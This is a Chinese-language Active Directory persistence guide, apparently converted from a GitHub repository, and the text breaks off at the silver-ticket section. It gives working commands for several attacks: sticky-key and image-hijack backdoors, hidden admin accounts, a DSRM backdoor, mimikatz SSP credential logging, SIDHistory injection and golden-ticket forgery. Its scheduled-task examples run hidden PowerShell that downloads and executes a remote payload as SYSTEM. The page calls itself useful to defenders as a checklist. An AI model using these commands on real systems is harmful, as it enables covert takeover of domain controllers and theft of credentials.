> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [github.com](https://github.com/JDArmy/DCSec/blob/main/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.md)

当在域控中获取权限以后，通过在域控中进行权限维持，可以持续对目标的控制。对于防守人员来说，通过这些域控维权的 checklist 也可以更好的保证域控的安全。

[](#目录)目录
=========

*   [粘滞键后门](#1-%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8)
*   [注册表后门](#2-%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%8E%E9%97%A8)
*   [计划任务](#3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1)
*   [wmi 无文件后门](#4-wmi%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8)
*   [隐藏用户](#5-%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7)
*   [DSRM 后门](#6-DSRM%E5%90%8E%E9%97%A8)
*   [SSP](#7-SSP)
*   [SIDHistory 域后门](#8-SIDHistory%E5%9F%9F%E5%90%8E%E9%97%A8)
*   [HookPasswordChangeNotify](#9-HookPasswordChangeNotify)
*   [GoldenTicket / 黄金票据](#10-GoldenTicket/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE)
*   [SilverTicket / 白银票据](#11-SilverTicket/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE)
*   [SkeletonKey / 万能密码](#12-SkeletonKey/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81)
*   [AdminSDHolder](#13-AdminSDHolder)
*   [ACL 后门](#14-ACL%E5%90%8E%E9%97%A8)
*   [dump 高权限用户的 hash](#15-dump%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E7%9A%84hash)

[](#1-粘滞键后门)1. 粘滞键后门
--------------------

### [](#11-修改目录下的-sethc)1.1 修改目录下的 sethc

在 windows/system32 下，直接将 sethc 程序替换成 cmd.exe

> 如果目标机是 `windows vista` 以上的，即 `windows vista` 以后出的系统，修改 sethc 会提示需要 `trustedinstaller` 权限，`trustedinstaller` 是一个安全机制，即系统的最高权限，权限比 `administrator` 管理员高.

windows 下的权限主要包括：user，administrator，system，`trustedinstaller`没有`system`高，所以需要修改`sethc`， 需要将其所有者改为改为我们当前管理员用户

[![](https://camo.githubusercontent.com/055d51a533a700bdbec47179505d2775e7814cd6d3dd9be77df96986d872edaf/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531313031303230362e706e67)](https://camo.githubusercontent.com/055d51a533a700bdbec47179505d2775e7814cd6d3dd9be77df96986d872edaf/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531313031303230362e706e67)

这时可以重命名，也可以直接删除，然后复制 cmd 修改 sethc 即可，然后在锁屏没有密码情况下，可以直接按 5 下 shift 调出 cmd

### [](#12-修改注册表的映像劫持)1.2 修改注册表的映像劫持

`通过修改注册表的映像劫持`和`打开其远程桌面`来实现。

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"

```

> **命令说明**：reg add 是向注册表添加记录，后面跟的是注册表的位置，这里需要注意的是 HKLM 实际上是 HKEY_LOCAL_MACHINE 的缩写。Image File Execution Option 这个目录就是用来设置镜像劫持的，要被劫持的就是命令中的 sethc 粘滞键程序，随后通过 /v 来指定键名，这个键名 debugger 是固定的，然后通过 /t 来指定类型，即 REG_SZ 字符串类型，最后通过 /d 来指定键的值，即被恶意替换的程序，也就是我们的 cmd。

效果如下：

[![](https://camo.githubusercontent.com/8ab45bef9a011b988b3b16fd167b422e3fff5ed67a738cc989d3557eced6b0e7/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531313031303534372e706e67)](https://camo.githubusercontent.com/8ab45bef9a011b988b3b16fd167b422e3fff5ed67a738cc989d3557eced6b0e7/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531313031303534372e706e67)

[](#2-注册表后门)2. 注册表后门
--------------------

开启启动项

```
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

```

msf 下的命令：

```
use exploit/windows/local/persistence

```

[](#3-计划任务)3. 计划任务
------------------

`schtasks`命令参数如下：

*   /Create 创建新任务。
*   /Delete 删除计划任务。
*   /Query 显示所有计划任务。
*   /Change 更改计划任务属性。
*   /Run 按需运行计划任务。
*   /End 中止当前正在运行的计划任务。
*   /ShowSid 显示与计划的任务名称相应的安全标识符

```
# schtasks 命令
# 每天晚上 03:30 定时执行
schtasks /create /tn "TimedTask1" /tr C:\Users\Administrator\Desktop\TimedTask\Run.bat /sc DAILY /st 03:30 
# statement A

# 查询创建的任务
schtasks /query /tn TimedTask1 /v

# 立即运行创建的任务
schtasks /run /tn TimedTask1

# 删除任务
schtasks /delete /tn TimedTask1

```

搭配远程下载如下：

```
#(X64) - On System Start
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System
 
#(X64) - On User Idle (30mins)
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30
 
#(X86) - On User Login
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onlogon /ru System
  
#(X86) - On System Start
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onstart /ru System
  
#(X86) - On User Idle (30mins)
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onidle /i 30


```

[](#4wmi无文件后门)4.wmi 无文件后门
-------------------------

`evil3.vbs` -> 恶意 VBS 脚本。创建事件过滤器，捕获账户成功登陆的事件；创建活动脚本事件消费者，捕获到事件后执行远程脚本 pnc.js; 绑定过滤器和消费者。

然后类似于 nc 一样的工具进行连接：

参考项目 ：

[https://github.com/SAMOxtan/WMI_Fileless_Backdoor](https://github.com/SAMOxtan/WMI_Fileless_Backdoor)

[https://github.com/SAMOxtan/WMI_Fileless_Backdoor](https://github.com/SAMOxtan/WMI_Fileless_Backdoor)

[](#5-隐藏用户)5. 隐藏用户
------------------

```
net user test$ 123456Qaq /add
net localgroup administrators test$ /add

```

[![](https://camo.githubusercontent.com/2b259640498b1d6487762a46966a9807f12426f54da3df70cb5665775fb323e3/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363039303435312e706e67)](https://camo.githubusercontent.com/2b259640498b1d6487762a46966a9807f12426f54da3df70cb5665775fb323e3/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363039303435312e706e67)

主要是创建影子用户的思路：[https://blog.csdn.net/weixin_51339377/article/details/124168411](https://blog.csdn.net/weixin_51339377/article/details/124168411)

[](#6-dsrm后门)6. DSRM 后门
-----------------------

DSRM(Directory Services Restore Mode) 是 Windows 域环境中域控制器的安全模式启动选项。每个域控制器有一个**本地管理员**账号 (也就是 DSRM 账号)。DSRM 的用途是: 允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM 的密码需要在安装 DC 时设置，且很少会被重置。修改 DSRM 密码最基本的方法是在 DC 上运 ntdsutil 行命令。

在渗透测试中，可以使用 DSRM 账号对域环境进行持久化操作。

*   如果域控制器的系统版本为 Windows Server 2008，则需要安装 KB96132 补丁才可以使用指定域账号的密码对 DSRM 的密码进行同步。
*   在 Windows Server 2008 以后版本的系统中不需要安装此补丁。
*   如果域控制器的系统版本为 Windows Server 2003，则不能使用该方法进行持久化操作。

每个 DC 都有本地管理员 (administrator) 账号和密码。DSRM 账号可以作为 DC 的本地管理员用户，通过网络连接 DC，进而控制 DC。

在 DC 上，DSRM 账号的表现形式是本地的 administrator 用户，也就是说本地 administrator 用户 = DSRM 账号

### [](#修改dsrm密码)修改 DSRM 密码

参考链接：[https://blog.csdn.net/weixin_36044132/article/details/119595410](https://blog.csdn.net/weixin_36044132/article/details/119595410)

微软官方给出的方法：

```
NTDSUTIL #打开ntdsutil
set DSRM password # ：修改DSRM的密码
reset password on  server xxxx # 在当前域控制器上重置DSRM的密码
# 重复确定两次密码以后就可以了
# q(第1次)：退出DSRM密码设置模式
# q(第2次)：退出ntdsutil

```

[![](https://camo.githubusercontent.com/2eb4c71ba40481bf750737d60355ac1767e6372763533103f51b9bcf6319ff1c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134323431332e706e67)](https://camo.githubusercontent.com/2eb4c71ba40481bf750737d60355ac1767e6372763533103f51b9bcf6319ff1c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134323431332e706e67)

### [](#设置-dsrm-后门)设置 DSRM 后门

上传`mimikatz`，在`administrator`权限下执行命令

```
privilege::debug
lsadump::lsa /patch /name:krbtgt

```

[![](https://camo.githubusercontent.com/5f0d4e3a3595a0ce1d18b169d162499ecaade943b653198fbc420574ac6e9789/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134323830322e706e67)](https://camo.githubusercontent.com/5f0d4e3a3595a0ce1d18b169d162499ecaade943b653198fbc420574ac6e9789/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134323830322e706e67)

获取到了`krbtgt` **NTLM Hash** 和 SID

接下来查看并获取 SAM 文件中本地管理员的 NTML 也就是 **DSRM 的 NTLM Hash 值**

```
token::elevate
lsadump::sam

```

[![](https://camo.githubusercontent.com/dad1e42ae0bfe49853ed11f5b2cc9cc59d448a07bdedabc2928abf11bbbf6c97/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134323933382e706e67)](https://camo.githubusercontent.com/dad1e42ae0bfe49853ed11f5b2cc9cc59d448a07bdedabc2928abf11bbbf6c97/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134323933382e706e67)

将 DSRM 账号和 krbtgt 的 NTML HASH 同步

```
NTDSUTIL
SET DSRM PASSWORD
SYNC FROM DOMAIN account krbtgt

```

[![](https://camo.githubusercontent.com/adf593f9eca8603728fb179e3056be566f14b282728a07000ad34477e4ca7a83/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134333332392e706e67)](https://camo.githubusercontent.com/adf593f9eca8603728fb179e3056be566f14b282728a07000ad34477e4ca7a83/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134333332392e706e67)

我们发现 krbtgt 的 NTLM 和 administrator 的 hash 成功同步

[![](https://camo.githubusercontent.com/70518a20bdcadc0d393b6c3c0c247d86d85e485919cc7fabbb051eb60c50c051/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134333534382e706e67)](https://camo.githubusercontent.com/70518a20bdcadc0d393b6c3c0c247d86d85e485919cc7fabbb051eb60c50c051/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134333534382e706e67)

最后修改一下 DSRM 的登录方式，DSRM 默认有三种方式

*   0: 默认值，只有当城控制器重启并进入 DSRM 模式时，才可以使用 DSRM 管理员账号。
    
*   1: 只有当本地 AD、DS 服务停止时，才可以使用 DSRM 管理员账号登录域控制器。
    
*   2: 在任何情况下，都可以使用 DSRM 管理员账号登录域控制器。
    

通过以下命名设置方式改为：2

以管理员方式运行 powershell：

```
New-ItemProperty "hklm:\system\currentcontrolset\control\lsa\" -name "dsrmadminlogonbehavior" -value 2 -propertyType DWORD

```

[![](https://camo.githubusercontent.com/0e5bcb815425a65857362393e5de6bf6542552cf605dca2265fbc5f5646247ef/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134343030302e706e67)](https://camo.githubusercontent.com/0e5bcb815425a65857362393e5de6bf6542552cf605dca2265fbc5f5646247ef/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134343030302e706e67)

最后，我们就可以使用本地`administrator` 账号哈希传递攻击域控

```
sekurlsa::pth /domain:main /user:test /ntlm:73265a93b877df146cf06d08ffa673e8

```

[![](https://camo.githubusercontent.com/524d8841a7c9c1cb3c3d1198553da0b0c03a98e20e52beb312b4ffdc74063a53/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134343635382e706e67)](https://camo.githubusercontent.com/524d8841a7c9c1cb3c3d1198553da0b0c03a98e20e52beb312b4ffdc74063a53/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363134343635382e706e67)

最后可以使用 Mimikatz 的 scysnc 功能远程转储 krbtgt 的 NTML Hash

```
lsadump::dcsync /domain:main.com /dc:DC /user:krbtgt

```

[](#7-ssp)7. SSP
----------------

SSP(**Security Support Provider**) 是 Windows 操作系统安全机制的提供者。简单地说，SSP 是个`DLL`文件，主要用来实现 Windows 操作系统的身份认证功能，例如`NTLM`、`Ketberos`,`Negotiare`.`Seure Channe`(Schannel)、`Digest`、`Credental`(CredSSP)。

SSPI ( **Security Support Provider Interfce**. 安全支持提供程序接口) 是 Windows 操作系统在执行认证操作时使用的 API 接口。可以说，SSPI 是 SSP 的 API 接口。

LSA( **Local Security Authority**)，用于身份认证，常见进程为 lsass.exe

如果获得了网络中目标机器的 System 权限，可以使用该方法进行持久化操作。其主要原理是: LSA (`Local Security Authority`) 用于身份验证;`lsass.exe` 作为 Windows 的系统进程，用于本地安全和登录策略; 在系统启动时，SSP 将被加载到`lsass.exe`进程中。但是，假如攻击者对 LSA 进行了扩展，自定义了恶意的 DLL 文件，在系统启动时将其加载到`lsass.exe`进程中，就能够获取`lsass.exe`进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。

使用 mimilib SSP

### [](#71通过内存更新留后门临时)7.1 通过内存更新留后门（临时）

由于是针对本机的 LSA 进行 Patch，因此本方法只针对在当前机器上登录的用户起作用

```
privilege::debug
misc::memssp

```

注销用户之后，可以访问`C:\Windows\System32\mimilsa.log`，会有日志文件

[![](https://camo.githubusercontent.com/ca7bd5b52281a0322e3573a8d5fb1b7d66932aa8b934669bb0005c33526ea8a1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323030313130352e706e67)](https://camo.githubusercontent.com/ca7bd5b52281a0322e3573a8d5fb1b7d66932aa8b934669bb0005c33526ea8a1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323030313130352e706e67)

### [](#72-通过注册表更新后门永久)7.2 通过注册表更新后门 (永久)

项目 [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases) 提供了一个 DLL 文件（mimilib.dll），可以将其放到与 LSASS 进程（System32）相同的位置，以便为访问受感染主机的任何用户获得纯文本凭据。

如下：

```
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
reg add "hklm\system\currentcontrolset\control\lsa" /v "Security Packages" /t REG_MULTI_SZ   /d  "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib.dll"

```

> 这里踩了一个坑，当路径已经到达末尾时，后面不要有`\`，否则会进行转义，如下：

[![](https://camo.githubusercontent.com/cc0314644d1a69f229166e89ea69f48b4c31a471cbce0e7343feede8ee0c92fb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323030313434352e706e67)](https://camo.githubusercontent.com/cc0314644d1a69f229166e89ea69f48b4c31a471cbce0e7343feede8ee0c92fb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323030313434352e706e67)

但是却找不到

[![](https://camo.githubusercontent.com/6276d7322d331961919f321dd64e54ce90f9a9fb0d854027feb3d260f1b3178e/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323030313933342e706e67)](https://camo.githubusercontent.com/6276d7322d331961919f321dd64e54ce90f9a9fb0d854027feb3d260f1b3178e/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323030313933342e706e67)

查看了一下注册表，没写进去

[![](https://camo.githubusercontent.com/6ee3b947ae58c44056e754ee2b5ce0852ed17a766846eb9c3c7891018e5271d0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323132303932392e706e67)](https://camo.githubusercontent.com/6ee3b947ae58c44056e754ee2b5ce0852ed17a766846eb9c3c7891018e5271d0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323132303932392e706e67)

去掉`\`之后，就成功写入了。

之后重启，访问`c:\windows\system32\kiwissp.log`即可得到

[![](https://camo.githubusercontent.com/dfbaba2d903fe8c4dbf75360a376d4c3617b920caa3f0bd99b09cc78cd24d544/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323132323633312e706e67)](https://camo.githubusercontent.com/dfbaba2d903fe8c4dbf75360a376d4c3617b920caa3f0bd99b09cc78cd24d544/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323132323633312e706e67)

[](#8-sidhistory域后门)8. SIDHistory 域后门
-------------------------------------

> 每个用户帐号都有一个关联的安全标识符（简称 SID），SID 用于跟踪安全主体在访问资源时的帐户与访问权限。为了支持 AD 迁移，微软设计了 SID History 属性，SID History 允许另一个帐户的访问被有效的克隆到另一个帐户。通过 SID History 可让用户拥有不同身份的权限，在单域中同样有效。

查询域内用户

```
dsquery user

```

[![](https://camo.githubusercontent.com/a71883bd634d272c64225f7179db95de32eeb47d973afa04d229edc026c5bb4a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323132323930382e706e67)](https://camo.githubusercontent.com/a71883bd634d272c64225f7179db95de32eeb47d973afa04d229edc026c5bb4a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323132323930382e706e67)

将工具上传 [https://github.com/lucasbiella/admodule](https://github.com/lucasbiella/admodule)

导入模块，查看用户的`SID History`

```
Import-Module activedirector
Get-ADUser liukaifeng01 -Properties sidhistory

```

[![](https://camo.githubusercontent.com/3507e6365919f87db67ed474b846cc4c889e673bb931e6b6d01353ba6fb0bef1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323031323731382e706e67)](https://camo.githubusercontent.com/3507e6365919f87db67ed474b846cc4c889e673bb931e6b6d01353ba6fb0bef1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323031323731382e706e67)

使用 Mimikatz 将 Administrator 的 SID 添加到所选用户的 SID History 属性中

> 1.  在使用 mimikatz 注入 SID 之前需要使用`sid::patch`命令修复 NTDS 服务，否则无法将高权限的 SID 注入低权限的用户的 SID 属性；
> 2.  mimikatz 在 2.1 版本之后将`misc::addsid`模块添加到了
> 3.  NTDS：New Technology Directory Service,NT

```
# mimikatz
privilege::debug
sid::patch    //以下命令如果执行失败则使用该命令修复NTDS服务
sid::add /sam:yyds /new:administrator

```

[![](https://camo.githubusercontent.com/749206c9b469bb7dbf7a068a4bf3d29ab89c640e405b454d3b0390e52b6eff06/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323031333030392e706e67)](https://camo.githubusercontent.com/749206c9b469bb7dbf7a068a4bf3d29ab89c640e405b454d3b0390e52b6eff06/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323031333030392e706e67)

这时候再看一下

[![](https://camo.githubusercontent.com/d6307d98b6798a84a8e951fa115de2b1718ed872b239156334f6693ecea56a30/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323031333035372e706e67)](https://camo.githubusercontent.com/d6307d98b6798a84a8e951fa115de2b1718ed872b239156334f6693ecea56a30/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323031333035372e706e67)

[](#9-hookpasswordchangenotify)9. HookPasswordChangeNotify
----------------------------------------------------------

`Hook PaswordChangeNoify`的作用是当用户修改密码后在系统中进行同步。攻击者可以利用该功能获取用户修改密码时输人的密码明文。

在修改域控密码时会进行如下同步操作：

1.  当修改域控密码时，LSA 首先调用 PasswordFileter 来判断新密码是否符合密码复杂度要求
2.  如果符合，LSA 接着调用 PasswordChangeNotify 在系统上同步更新密码

> 函数 PasswordChangeNotify 存在于 rassfm.dll
> 
> rassfm.dll 可理解为 Remote Access Subauthentication dll，只存在于在 Server 系统下，xp、win7、win8 等均不存在

特点是：

1.  不需要重启
2.  不需要修改注册表
3.  甚至不需要在系统放置 dll

参考项目：

[https://github.com/clymb3r/PowerShell](https://github.com/clymb3r/PowerShell)

[https://github.com/clymb3r/Misc-Windows-Hacking](https://github.com/clymb3r/Misc-Windows-Hacking)

[](#10-goldenticket黄金票据)10. GoldenTicket / 黄金票据
-----------------------------------------------

== 黄金票据的目的是：权限变更。==

假设域内存在一个 SID 为 502 的域账号 krbtgt。 krbtgt 是 KDC 服务使用的账号, 属于 Domain Admins 组。在域环境中, 每个用户账号的票据都是由 krbtgt 生成的, 如果攻击者拿到了 krbtgt 的`NTLM Hash`或者`AES-256`值，就可以伪造域内任意用户的身份, 并以该用户的身份访问其他服务。攻击者在使用域的 Golden Ticket（黄金票据) 进行票据传递攻击时, 通堂要堂握以下信息：

1.  完整的域名
2.  需要伪造的域管理员用户名
3.  域 SID-Krbtgt 的 NTLM Hash 或 AES-256

<table><thead><tr><th>操作系统</th><th>角色</th><th>域名</th><th>用户名</th></tr></thead><tbody><tr><td>Wins2012R2</td><td>DC</td><td>main.com</td><td>12451</td></tr><tr><td>windows 2008</td><td>Client</td><td>main.com</td><td>test</td></tr></tbody></table>

实现：

1.  先获得 hash 和 SID

```
lsadump::lsa /patch      #专用于在域控制器上导出用户密码或hash

```

[![](https://camo.githubusercontent.com/895af0f81370f089a5aa03584486a3f375e0e33c7917bb99b4322db3d28de474/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323134323530322e706e67)](https://camo.githubusercontent.com/895af0f81370f089a5aa03584486a3f375e0e33c7917bb99b4322db3d28de474/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323134323530322e706e67)

我们得到 krbtgt 用户的 Hash 为：73265a93b877df146cf06d08ffa673e8，域 sid 为 S-1-5-21-2214894582-1205818508-3793940241

2.  切换到普通域用户的 WEB 主机或 PC 主机，用 mimikatz 生成名为 ticket.kirbi 的 TGT 凭证，用户名为域管理员用户（administrator）：
    
    ```
    # kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi
    kerberos::golden /user:administrator /domain:main.com /sid:S-1-5-21-2214894582-1205818508-3793940241 /krbtgt:73265a93b877df146cf06d08ffa673e8 /ticket:ticket.kirbi
    
    
    ```
    
    [![](https://camo.githubusercontent.com/03edccc222206226d492baf9ad6c90b75fe405672fd4c1b48ece0f39148123c1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323134333930392e706e67)](https://camo.githubusercontent.com/03edccc222206226d492baf9ad6c90b75fe405672fd4c1b48ece0f39148123c1/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323134333930392e706e67)
    
    在当前目录下会生成一个`ticket.kirbi`
    
    ```
    kerberos::purge   //先清空所有票据
    kerberos::ptt ticket.kirbi    //再将生成的票据注入域用户主机
    
    ```
    
    然后查看一下当前的票据内容
    
    ```
    kerberos::tgt
    
    
    ```
    
    [![](https://camo.githubusercontent.com/de877796c354db653d7a52ad278f4d262ba54d82380d88c730db01d3362c58af/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323134343435302e706e67)](https://camo.githubusercontent.com/de877796c354db653d7a52ad278f4d262ba54d82380d88c730db01d3362c58af/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323134343435302e706e67)
    
    对比一下之前的操作，当我们想看 DC 下的共享目录的时候：拒绝访问
    
    [![](https://camo.githubusercontent.com/d8e6172af32a6c5e18fc10c0749f2da16cb3487aaf98e3a87a4a4261ae0cd8e2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323136303130322e706e67)](https://camo.githubusercontent.com/d8e6172af32a6c5e18fc10c0749f2da16cb3487aaf98e3a87a4a4261ae0cd8e2/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323136303130322e706e67)
    
    更改凭证之后
    
    [![](https://camo.githubusercontent.com/ddb5339cd853dbba1461d54700d851a2f04dca4c40d55e7b915d114d426d5220/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323136303930322e706e67)](https://camo.githubusercontent.com/ddb5339cd853dbba1461d54700d851a2f04dca4c40d55e7b915d114d426d5220/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531323136303930322e706e67)
    

[](#11-silverticket白银票据)11. SilverTicket / 白银票据
-----------------------------------------------

**Silver Ticket**(白银票据) 不同于 Golden Ticket, Silver Ticket 的利用过程是**伪造 TGS**, 通过已知的授权服务密码生成一张可以访问该服务的 TGT。因为在票据生成过程中不需要使用 KDC, 所以可以绕过域控制器，很少留下日志。而 Golden Ticket 在利用过程中需要 KDC 颁发 TGT, 且在生成伪造的 TGT 的 20 分钟内, TGS 不会对该 TGT 的真伪进行校验。

> 白银票据和黄金票据的区别：
> 
> 1.  金票是由 krbtgt 账号的密码散列值加密的，利用伪造高权限任意服务访回权限的票据, 从而获得域控制器权限，而银票是由特定的服务账号来伪造 TGS，例如 LDAP、 MSSQL、WinRM、 DNS、CIFS 等，范围有限，只能获取有限的权限。
> 2.  白银票据不经过 KDC，因此白银票据日志相对于黄金票据要少，同时白银票据的日志都在目标服务器上，域控上不会有日志，更加隐蔽，但是白银票据的权限就不如黄金票据的权限了

和黄金票据不同的是，白银票据的针对性较强，没有金票的普适性，即拿到服务 A 的口令 NTLM 值只能伪造高权限的 TGS 票据，获得服务 A 的高权限访问，对服务 B 则完全无效。

<table><thead><tr><th>应用服务类型</th><th>需要的服务</th></tr></thead><tbody><tr><td>VMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoting</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administrations Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table>

输入`klist`可以获得

[![](https://camo.githubusercontent.com/244369a09aa244b9724453c29dd4a94f2d0ce87c734ce6e6ec4f71d62bacc078/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363038343731302e706e67)](https://camo.githubusercontent.com/244369a09aa244b9724453c29dd4a94f2d0ce87c734ce6e6ec4f71d62bacc078/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f68306c643172732f696d6167652f696d6167652f32303232303531363038343731302e706e67)

这里很明显看到有两个服务，一个`krbtgt`，一个是`host`

### [](#111-伪造host服务权限---创建计划任务)11.1 伪造 Host 服务权限 --- 创建计划任务

```
